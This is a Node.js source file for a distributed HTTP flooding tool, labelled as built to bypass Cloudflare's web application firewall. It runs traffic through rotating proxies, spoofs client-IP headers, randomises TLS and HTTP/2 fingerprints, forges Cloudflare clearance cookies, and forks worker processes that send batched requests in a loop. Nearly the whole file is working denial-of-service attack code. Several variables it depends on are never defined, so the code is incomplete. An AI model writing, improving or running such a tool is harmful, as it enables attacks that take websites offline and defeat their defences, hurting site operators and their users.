//mix http 2 1,1 - Enhanced for Cloudflare WAF bypass
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const chalk = require('chalk');
const { Buffer } = require('buffer');

// Enhanced proxy management with validation and health checking
class ProxyManager {
  constructor(proxyFile) {
    this.proxies = [];
    this.healthyProxies = [];
    this.failedProxies = new Map();
    this.proxyStats = new Map();
    this.loadProxies(proxyFile);
    this.startHealthCheck();
  }

  loadProxies(proxyFile) {
    const rawProxies = fs.readFileSync(proxyFile, 'utf8').replace(/\r/g, '').split('\n');
    
    this.proxies = rawProxies
      .filter(line => {
        const [host, port, username, password] = line.split(':');
        return host && port && !isNaN(port);
      })
      .map(line => {
        const [host, port, username, password] = line.split(':');
        return {
          host: host.trim(),
          port: parseInt(port.trim()),
          username: username ? username.trim() : null,
          password: password ? password.trim() : null,
          lastUsed: 0,
          successCount: 0,
          failureCount: 0,
          lastError: null,
          isHealthy: true
        };
      });

    if (this.proxies.length === 0) {
      console.error('No valid proxies found');
      process.exit(1);
    }

    this.healthyProxies = [...this.proxies];
    console.log(`Loaded ${this.proxies.length} proxies`);
  }

  getRandomProxy() {
    if (this.healthyProxies.length === 0) {
      this.healthyProxies = this.proxies.filter(p => p.isHealthy);
      if (this.healthyProxies.length === 0) {
        this.healthyProxies = [...this.proxies];
      }
    }

    // Weighted selection based on success rate
    const weights = this.healthyProxies.map(proxy => {
      const total = proxy.successCount + proxy.failureCount;
      return total === 0 ? 1 : proxy.successCount / total;
    });

    const totalWeight = weights.reduce((sum, weight) => sum + weight, 0);
    let random = Math.random() * totalWeight;

    for (let i = 0; i < this.healthyProxies.length; i++) {
      random -= weights[i];
      if (random <= 0) {
        return this.healthyProxies[i];
      }
    }

    return this.healthyProxies[0];
  }

  markProxySuccess(proxy) {
    proxy.successCount++;
    proxy.lastUsed = Date.now();
    proxy.isHealthy = true;
  }

  markProxyFailure(proxy, error) {
    proxy.failureCount++;
    proxy.lastError = error;
    
    const total = proxy.successCount + proxy.failureCount;
    if (total > 10 && proxy.failureCount / total > 0.5) {
      proxy.isHealthy = false;
      this.healthyProxies = this.healthyProxies.filter(p => p !== proxy);
    }
  }

  startHealthCheck() {
    setInterval(() => {
      this.healthCheck();
    }, 30000);
  }

  async healthCheck() {
    const unhealthyProxies = this.proxies.filter(p => !p.isHealthy);
    
    for (const proxy of unhealthyProxies.slice(0, 5)) {
      try {
        await this.testProxy(proxy);
        proxy.isHealthy = true;
        this.healthyProxies.push(proxy);
      } catch (error) {
        // Keep as unhealthy
      }
    }
  }

  async testProxy(proxy) {
    return new Promise((resolve, reject) => {
      const socket = net.connect(proxy.port, proxy.host, () => {
        socket.destroy();
        resolve();
      });

      socket.on('error', reject);
      socket.setTimeout(5000, () => {
        socket.destroy();
        reject(new Error('Timeout'));
      });
    });
  }
}

// Enhanced IP rotation and header spoofing
class IPRotationManager {
  constructor() {
    this.legitIPs = this.generateLegitIPPool();
    this.currentIPIndex = 0;
    this.ipRotationInterval = 10000; // Rotate every 10 seconds
    this.startRotation();
  }

  generateLegitIPPool() {
    const asnData = [
      { asn: "AS15169", country: "US", ip: "8.8.8." },
      { asn: "AS8075", country: "US", ip: "13.107.21." },
      { asn: "AS14061", country: "SG", ip: "104.18.32." },
      { asn: "AS13335", country: "NL", ip: "162.158.78." },
      { asn: "AS16509", country: "DE", ip: "3.120.0." },
      { asn: "AS14618", country: "JP", ip: "52.192.0." },
      { asn: "AS32934", country: "US", ip: "157.240.0." },
      { asn: "AS54113", country: "US", ip: "104.244.42." },
      { asn: "AS15133", country: "US", ip: "69.171.250." }
    ];

    return asnData.map(data => ({
      ip: `${data.ip}${Math.floor(Math.random() * 255)}`,
      asn: data.asn,
      country: data.country
    }));
  }

  getCurrentIP() {
    return this.legitIPs[this.currentIPIndex];
  }

  startRotation() {
    setInterval(() => {
      this.currentIPIndex = (this.currentIPIndex + 1) % this.legitIPs.length;
    }, this.ipRotationInterval);
  }

  generateAdvancedHeaders() {
    const currentIP = this.getCurrentIP();
    const headers = {};

    // Cloudflare-specific headers
    if (Math.random() < 0.7) headers["cf-connecting-ip"] = currentIP.ip;
    if (Math.random() < 0.6) headers["cf-ipcountry"] = currentIP.country;
    if (Math.random() < 0.5) headers["cf-ray"] = `${crypto.randomBytes(8).toString('hex')}-${currentIP.country}`;
    if (Math.random() < 0.4) headers["cf-visitor"] = '{"scheme":"https"}';
    
    // CDN headers
    if (Math.random() < 0.5) headers["cdn-loop"] = `${currentIP.ip}:${crypto.randomBytes(3).toString('hex')}`;
    if (Math.random() < 0.4) headers["true-client-ip"] = currentIP.ip;
    if (Math.random() < 0.5) headers["via"] = `1.1 ${currentIP.ip}`;
    if (Math.random() < 0.6) headers["request-context"] = `appId=${crypto.randomBytes(4).toString('hex')};ip=${currentIP.ip}`;
    if (Math.random() < 0.4) headers["x-edge-ip"] = currentIP.ip;
    if (Math.random() < 0.3) headers["x-coming-from"] = currentIP.ip;
    if (Math.random() < 0.4) headers["akamai-client-ip"] = currentIP.ip;

    // Additional evasion headers
    if (Math.random() < 0.3) headers["x-forwarded-for"] = currentIP.ip;
    if (Math.random() < 0.3) headers["x-real-ip"] = currentIP.ip;
    if (Math.random() < 0.2) headers["x-cluster-client-ip"] = currentIP.ip;

    return headers;
  }
}

// Enhanced TLS fingerprint evasion
class TLSFingerprintManager {
  constructor() {
    this.fingerprints = this.generateMultipleFingerprints();
    this.currentFingerprintIndex = 0;
  }

  generateMultipleFingerprints() {
    const fingerprints = [];
    
    for (let i = 0; i < 10; i++) {
      fingerprints.push({
        ja3: this.generateJA3Fingerprint(),
        ja4: this.generateJA4Fingerprint(),
        http2: this.generateHTTP2Fingerprint(),
        plugins: this.generateFakePlugins()
      });
    }
    
    return fingerprints;
  }

  getCurrentFingerprint() {
    const fingerprint = this.fingerprints[this.currentFingerprintIndex];
    this.currentFingerprintIndex = (this.currentFingerprintIndex + 1) % this.fingerprints.length;
    return fingerprint;
  }

  generateJA3Fingerprint() {
    const ciphers = [
      'TLS_AES_128_GCM_SHA256',
      'TLS_AES_256_GCM_SHA384', 
      'TLS_CHACHA20_POLY1305_SHA256',
      'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
      'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
      'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
      'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
      'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
      'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256'
    ];

    const signatureAlgorithms = [
      'ecdsa_secp256r1_sha256',
      'rsa_pss_rsae_sha256',
      'rsa_pkcs1_sha256',
      'ecdsa_secp384r1_sha384',
      'rsa_pss_rsae_sha384',
      'rsa_pkcs1_sha384'
    ];

    const curves = ['X25519', 'secp256r1', 'secp384r1'];
    const extensions = ['0', '5', '10', '13', '16', '18', '23', '27', '35', '43', '45', '51', '65281'];

    return {
      ciphers: this.shuffleArray([...ciphers]),
      signatureAlgorithms: this.shuffleArray([...signatureAlgorithms]),
      curves: this.shuffleArray([...curves]),
      extensions: this.shuffleArray([...extensions])
    };
  }

  generateJA4Fingerprint() {
    return {
      tls_version: 'TLSv1.3',
      cipher_suites: 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256',
      extensions: '0-5-10-13-16-18-23-27-35-43-45-51',
      signature_algorithms: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256',
      supported_groups: 'X25519:secp256r1:secp384r1'
    };
  }

  generateHTTP2Fingerprint() {
    return {
      HEADER_TABLE_SIZE: Math.floor(Math.random() * 16384) + 4096,
      ENABLE_PUSH: Math.random() > 0.5 ? 1 : 0,
      MAX_CONCURRENT_STREAMS: Math.floor(Math.random() * 400) + 100,
      INITIAL_WINDOW_SIZE: Math.floor(Math.random() * 196608) + 65535,
      MAX_FRAME_SIZE: Math.floor(Math.random() * 49152) + 16384,
      MAX_HEADER_LIST_SIZE: Math.floor(Math.random() * 24576) + 8192,
      ENABLE_CONNECT_PROTOCOL: Math.random() > 0.5 ? 1 : 0
    };
  }

  generateFakePlugins() {
    const plugins = [
      { name: "Chrome PDF Plugin", description: "Portable Document Format", filename: "internal-pdf-viewer" },
      { name: "Native Client", description: "Native Client", filename: "internal-nacl-plugin" },
      { name: "Widevine Content Decryption Module", description: "Enables Widevine licenses", filename: "libwidevinecdm.so" }
    ];

    return {
      count: plugins.length,
      list: plugins
    };
  }

  shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
  }
}

// Enhanced request timing and rate limiting
class RequestTimingManager {
  constructor() {
    this.baseDelay = 100;
    this.maxDelay = 2000;
    this.currentDelay = this.baseDelay;
    this.successCount = 0;
    this.failureCount = 0;
    this.adaptiveMode = true;
  }

  getNextDelay() {
    if (!this.adaptiveMode) {
      return this.currentDelay;
    }

    const total = this.successCount + this.failureCount;
    if (total === 0) return this.currentDelay;

    const successRate = this.successCount / total;
    
    if (successRate > 0.8) {
      // Reduce delay if success rate is high
      this.currentDelay = Math.max(this.baseDelay, this.currentDelay * 0.9);
    } else if (successRate < 0.3) {
      // Increase delay if success rate is low
      this.currentDelay = Math.min(this.maxDelay, this.currentDelay * 1.2);
    }

    // Add random jitter
    const jitter = Math.random() * 0.3 - 0.15; // ±15%
    return Math.floor(this.currentDelay * (1 + jitter));
  }

  recordSuccess() {
    this.successCount++;
  }

  recordFailure() {
    this.failureCount++;
  }

  reset() {
    this.successCount = 0;
    this.failureCount = 0;
  }
}

// Initialize managers
const proxyManager = new ProxyManager(process.argv[7]);
const ipManager = new IPRotationManager();
const tlsManager = new TLSFingerprintManager();
const timingManager = new RequestTimingManager();

// Rest of the original code with enhanced proxy handling
function go() {
  const proxy = proxyManager.getRandomProxy();
  
  if (!proxy) {
    setTimeout(go, 1000);
    return;
  }

  let tlsSocket;
  let http11Socket;

  // Enhanced connection with better error handling
  const netSocket = net.connect(proxy.port, proxy.host, () => {
    netSocket.once('data', () => {
      // Create connections based on forceHttp setting
      if (forceHttp === 2) {
        createHTTP2Connection();
      } else if (forceHttp === 1) {
        createHTTP11Connection();
      } else {
        createHTTP2Connection();
        createHTTP11Connection();
      }
    });

    // Enhanced CONNECT request with better headers
    const connectHeaders = [
      `CONNECT ${url.host}:443 HTTP/1.1`,
      `Host: ${url.host}:443`,
      `Connection: Keep-Alive`,
      `Proxy-Connection: keep-alive`,
      `User-Agent: ${generateUserAgent()}`,
      ...Object.entries(ipManager.generateAdvancedHeaders()).map(([k, v]) => `${k}: ${v}`)
    ].join('\r\n') + '\r\n\r\n';

    netSocket.write(connectHeaders);
  });

  netSocket.on('error', (error) => {
    proxyManager.markProxyFailure(proxy, error);
    setTimeout(go, timingManager.getNextDelay());
  });

  netSocket.on('close', () => {
    setTimeout(go, timingManager.getNextDelay());
  });

  function createHTTP2Connection() {
    const fingerprint = tlsManager.getCurrentFingerprint();
    
    tlsSocket = tls.connect({
      socket: netSocket,
      ALPNProtocols: ['h2', 'http/1.1'],
      servername: url.host,
      ciphers: fingerprint.ja3.ciphers.join(':'),
      sigalgs: fingerprint.ja3.signatureAlgorithms.join(':'),
      secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3,
      secure: true,
      rejectUnauthorized: false,
      minVersion: 'TLSv1.2',
      maxVersion: 'TLSv1.3'
    }, () => {
      if (tlsSocket.alpnProtocol === 'h2') {
        // HTTP/2 implementation with enhanced evasion
        sendHTTP2Requests();
      }
    });

    tlsSocket.on('error', (error) => {
      proxyManager.markProxyFailure(proxy, error);
      tlsSocket.destroy();
    });
  }

  function createHTTP11Connection() {
    const fingerprint = tlsManager.getCurrentFingerprint();
    
    http11Socket = tls.connect({
      socket: netSocket,
      ALPNProtocols: ['http/1.1'],
      servername: url.host,
      ciphers: fingerprint.ja3.ciphers.join(':'),
      sigalgs: fingerprint.ja3.signatureAlgorithms.join(':'),
      secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3,
      secure: true,
      rejectUnauthorized: false,
      minVersion: 'TLSv1.2',
      maxVersion: 'TLSv1.3'
    }, () => {
      sendHTTP11Requests();
    });

    http11Socket.on('error', (error) => {
      proxyManager.markProxyFailure(proxy, error);
      http11Socket.destroy();
    });
  }

  function sendHTTP2Requests() {
    if (tlsSocket.destroyed) return;

    const batchSize = Math.min(ratelimit * 2, 50);
    const requests = [];

    for (let i = 0; i < batchSize; i++) {
      const method = reqmethod;
      const path = url.pathname + (query ? handleQuery(query) : '');
      
      const headers = [
        [':method', method],
        [':authority', url.hostname],
        [':scheme', 'https'],
        [':path', path],
        ...generateDynamicHeaders(),
        ['cookie', generateCfClearanceCookie()]
      ];

      const packed = Buffer.concat([
        Buffer.from([0x80, 0, 0, 0, 0xFF]),
        hpack.encode(headers)
      ]);

      requests.push(encodeFrame(i * 2 + 1, 1, packed, 0x25));
    }

    tlsSocket.write(Buffer.concat(requests), (err) => {
      if (err) {
        proxyManager.markProxyFailure(proxy, err);
        tlsSocket.destroy();
      } else {
        proxyManager.markProxySuccess(proxy);
        timingManager.recordSuccess();
        setTimeout(sendHTTP2Requests, timingManager.getNextDelay());
      }
    });
  }

  function sendHTTP11Requests() {
    if (http11Socket.destroyed) return;

    const batchSize = Math.min(ratelimit, 30);
    const requests = [];

    for (let i = 0; i < batchSize; i++) {
      const method = reqmethod;
      const path = url.pathname + (query ? handleQuery(query) : '');
      
      const headers = [
        `Host: ${url.hostname}`,
        `User-Agent: ${generateUserAgent()}`,
        ...Object.entries(ipManager.generateAdvancedHeaders()).map(([k, v]) => `${k}: ${v}`),
        `Cookie: ${generateCfClearanceCookie()}`,
        `Connection: keep-alive`
      ].join('\r\n');

      const request = `${method} ${path} HTTP/1.1\r\n${headers}\r\n\r\n`;
      requests.push(request);
    }

    http11Socket.write(requests.join(''), (err) => {
      if (err) {
        proxyManager.markProxyFailure(proxy, err);
        http11Socket.destroy();
      } else {
        proxyManager.markProxySuccess(proxy);
        timingManager.recordSuccess();
        setTimeout(sendHTTP11Requests, timingManager.getNextDelay());
      }
    });
  }
}

// Enhanced utility functions
function generateUserAgent() {
  const versions = ['130.0.6723.116', '131.0.6778.85', '132.0.6823.84'];
  const version = versions[Math.floor(Math.random() * versions.length)];
  return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36`;
}

function generateDynamicHeaders() {
  const headers = [
    ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'],
    ['accept-language', 'en-US,en;q=0.9'],
    ['accept-encoding', 'gzip, deflate, br'],
    ['sec-fetch-site', 'none'],
    ['sec-fetch-mode', 'navigate'],
    ['sec-fetch-dest', 'document'],
    ['sec-ch-ua', '"Chromium";v="130", "Not?A_Brand";v="99"'],
    ['sec-ch-ua-mobile', '?0'],
    ['sec-ch-ua-platform', '"Windows"']
  ];

  return headers;
}

function generateCfClearanceCookie() {
  const timestamp = Math.floor(Date.now() / 1000);
  const clientId = crypto.randomBytes(16).toString('hex');
  const challengeId = crypto.randomBytes(8).toString('hex');
  const version = Math.floor(Math.random() * 6) + 17494;
  
  return `cf_clearance=${clientId}.${challengeId}-${version}.${timestamp}.${crypto.randomBytes(8).toString('hex')}`;
}

function handleQuery(queryType) {
  switch (queryType) {
    case '1':
      return `?cf__chl_tk=${crypto.randomBytes(16).toString('hex')}`;
    case '2':
      return `?${crypto.randomBytes(4).toString('hex')}=${crypto.randomBytes(8).toString('hex')}`;
    case '3':
      return `?q=${crypto.randomBytes(6).toString('hex')}`;
    default:
      return '';
  }
}

// HTTP/2 frame encoding functions (keeping original implementation)
function encodeFrame(streamId, type, payload = "", flags = 0) {
  let frame = Buffer.alloc(9);
  frame.writeUInt32BE(payload.length << 8 | type, 0);
  frame.writeUInt8(flags, 4);
  frame.writeUInt32BE(streamId, 5);
  if (payload.length > 0)
    frame = Buffer.concat([frame, payload]);
  return frame;
}

// Initialize hpack
const hpack = new HPACK();

// Main execution
if (cluster.isMaster) {
  const workerCount = Math.min(process.argv[5], os.cpus().length * 2);
  
  for (let i = 0; i < workerCount; i++) {
    cluster.fork();
  }
  
  console.log(`Enhanced script started with ${workerCount} workers`);
} else {
  // Worker process
  const sendRequests = () => {
    go();
    setTimeout(sendRequests, timingManager.getNextDelay());
  };
  
  sendRequests();
}